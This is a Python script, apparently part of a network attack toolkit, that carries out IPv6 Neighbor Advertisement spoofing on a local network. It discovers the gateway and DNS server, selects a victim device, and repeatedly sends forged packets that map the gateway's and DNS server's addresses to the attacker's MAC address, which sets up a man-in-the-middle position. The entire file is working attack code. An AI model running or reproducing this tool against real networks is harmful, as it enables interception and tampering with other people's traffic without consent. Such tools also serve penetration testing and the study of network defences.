#!/usr/bin/env python

# region Import
from sys import path
from os.path import dirname, abspath

project_root_path = dirname(dirname(dirname(abspath(__file__))))
utils_path = project_root_path + "/Utils/"
path.append(utils_path)

from base import Base
from scanner import Scanner
from argparse import ArgumentParser
from socket import socket, AF_PACKET, SOCK_RAW
from network import ICMPv6_raw
from time import sleep
from icmpv6_scan import ICMPv6Scan

# endregion

# region Check user, platform and create threads
Base = Base()
Base.check_user()
Base.check_platform()
icmpv6 = ICMPv6_raw()
icmpv6_scan = ICMPv6Scan()
scanner = Scanner()
# endregion

# region Parse script arguments
parser = ArgumentParser(description='NA (Neighbor Advertisement) spoofing')

parser.add_argument('-i', '--interface', help='Set interface name for send ARP packets')
parser.add_argument('-t', '--target_ip', help='Set client IPv6 link local address', default=None)
parser.add_argument('-g', '--gateway_ip', help='Set gateway IPv6 link local address', default=None)
parser.add_argument('-d', '--dns_ip', help='Set DNS server IPv6 link local address', default=None)
parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')

args = parser.parse_args()
# endregion

# region Print banner if argument quit is not set
if not args.quiet:
    Base.print_banner()
# endregion

# region Get your network settings
if args.interface is None:
    Base.print_warning("Please set a network interface for sniffing ICMPv6 responses ...")
current_network_interface = Base.netiface_selection(args.interface)

your_mac_address = Base.get_netiface_mac_address(current_network_interface)
if your_mac_address is None:
    Base.print_error("Network interface: ", current_network_interface, " do not have MAC address!")
    exit(1)

your_ipv6_link_address = Base.get_netiface_ipv6_link_address(current_network_interface)
if your_ipv6_link_address is None:
    Base.print_error("Network interface: ", current_network_interface, " do not have link local IPv6 address!")
    exit(1)
# endregion

# region Global variables
target_ipv6_address = None
target_mac_address = None
gateway_ipv6_address = None
gateway_mac_address = None
dns_ipv6_address = None
# endregion

# region Create global raw socket
socket_global = socket(AF_PACKET, SOCK_RAW)
socket_global.bind((current_network_interface, 0))
# endregion

# region General output
if not args.quiet:
    Base.print_info("Network interface: ", current_network_interface)
    Base.print_info("Your IPv6 address: ", your_ipv6_link_address)
    Base.print_info("Your MAC address: ", your_mac_address)
# endregion

# region Main function
if __name__ == "__main__":

    # region Check arguments: gateway_ip and dns_ip

    # region Set variable for scan results
    router_advertisement_data = None
    # endregion

    # region Search Gateway and DNS servers
    if args.gateway_ip is None and args.dns_ip is None:

        Base.print_info("Search IPv6 gateway ....")
        router_advertisement_data = icmpv6_scan.search_router(current_network_interface, 5, 3)

        if router_advertisement_data is not None:
            gateway_ipv6_address = router_advertisement_data['router_ipv6_address']
            gateway_mac_address = router_advertisement_data['router_mac_address']

            if 'dns-server' in router_advertisement_data.keys():
                dns_ipv6_address = router_advertisement_data['dns-server']
        else:
            Base.print_error("Can not find IPv6 gateway in local network on interface: ", current_network_interface)
            exit(1)
    # endregion

    # region Check arguments: gateway_ip and dns_ip
    else:

        # region Check argument: gateway_ip
        if args.gateway_ip is not None:
            if Base.ipv6_address_validation(args.gateway_ip):
                if str(args.gateway_ip).startswith("fe80::"):
                    if args.gateway_ip != your_ipv6_link_address:
                        gateway_ipv6_address = args.gateway_ip
                    else:
                        Base.print_error("Bad value `-g, --gateway_ip`: ", args.gateway_ip,
                                         "; Gateway IPv6 address is your Link local IPv6 address!")
                        exit(1)
                else:
                    Base.print_error("Bad value `-g, --gateway_ip`: ", args.gateway_ip,
                                     "; Gateway link local ipv6 address must be starts with: ", "fe80::")
                    exit(1)
            else:
                Base.print_error("Bad value `-g, --gateway_ip`: ", args.gateway_ip,
                                 "; Failed to verify ipv6 address!")
                exit(1)
        # endregion

        # region Check argument: dns_ip
        if args.dns_ip is not None:
            if Base.ipv6_address_validation(args.dns_ip):
                dns_ipv6_address = args.dns_ip
            else:
                Base.print_error("Bad value `-d, --dns_ip`: ", args.dns_ip,
                                 "; Failed to verify ipv6 address!")
                exit(1)
        # endregion

    # endregion

    # region Print Gateway and DNS server information
    Base.print_success("Gateway IPv6 address: ", gateway_ipv6_address)
    Base.print_success("Gateway MAC address: ", gateway_mac_address)

    if router_advertisement_data is not None:
        Base.print_success("Gateway Vendor: ", router_advertisement_data['vendor'])

    if dns_ipv6_address is not None:
        Base.print_success("DNS IPv6 address: ", dns_ipv6_address)

    router_advertisement_data = None
    # endregion

    # endregion

    # region Check argument: target_ip

    # region Set variable for scan results
    target = None
    # endregion

    # region Search targets in local network
    if args.target_ip is None:
        Base.print_info("Search IPv6 devices ....")
        ipv6_devices = scanner.find_ipv6_devices(current_network_interface, 5, 3, gateway_ipv6_address)
        target = scanner.ipv6_device_selection(ipv6_devices)
        target_ipv6_address = target[0]
        target_mac_address = target[1]
    # endregion

    # region Check argument: target_ip
    else:
        if Base.ipv6_address_validation(args.target_ip):
            if str(args.target_ip).startswith("fe80::"):
                if args.target_ip != your_ipv6_link_address:
                    if args.target_ip != gateway_ipv6_address:
                        target_ipv6_address = args.target_ip
                    else:
                        Base.print_error("Bad value `-t, --target_ip`: ", args.target_ip,
                                         "; Target IPv6 address is gateway link local IPv6 address!")
                        exit(1)
                else:
                    Base.print_error("Bad value `-t, --target_ip`: ", args.target_ip,
                                     "; Target IPv6 address is your link local IPv6 address!")
                    exit(1)
            else:
                Base.print_error("Bad value `-t, --target_ip`: ", args.target_ip,
                                 "; Target link local ipv6 address must be starts with: ", "fe80::")
                exit(1)
        else:
            Base.print_error("Bad value `-t, --target_ip`: ", args.target_ip,
                             "; Failed to verify ipv6 address!")
            exit(1)
    # endregion

    # region Print Target information
    Base.print_info("Target IPv6 address: ", target_ipv6_address)

    if target_mac_address is not None:
        Base.print_info("Target MAC address: ", target_mac_address)

    if target is not None:
        Base.print_info("Target Vendor: ", target[2])

    target = None
    # endregion

    # endregion

    # region Start spoofing
    try:
        Base.print_info("Send Neighbor Advertisement packets to: ", target_ipv6_address +
                        " (" + target_mac_address + ")")
        Base.print_info("Start Neighbor Advertisement spoofing ...")

        na_packets = []
        na_packet = icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                              ethernet_dst_mac=target_mac_address,
                                                              ipv6_src=gateway_ipv6_address,
                                                              ipv6_dst=target_ipv6_address,
                                                              target_ipv6_address=gateway_ipv6_address)
        na_packets.append(na_packet)

        if dns_ipv6_address != gateway_ipv6_address:
            if str(dns_ipv6_address).startswith("fe80::"):
                na_packet = icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                                      ethernet_dst_mac=target_mac_address,
                                                                      ipv6_src=dns_ipv6_address,
                                                                      ipv6_dst=target_ipv6_address,
                                                                      target_ipv6_address=dns_ipv6_address)
                na_packets.append(na_packet)

        while True:
            if len(na_packets) > 1:
                for na_packet in na_packets:
                    socket_global.send(na_packet)
                    sleep(1)
            else:
                socket_global.send(na_packet)
                sleep(2)

    except KeyboardInterrupt:
        socket_global.close()
        Base.print_info("Exit")
        exit(0)
    # endregion

# endregion
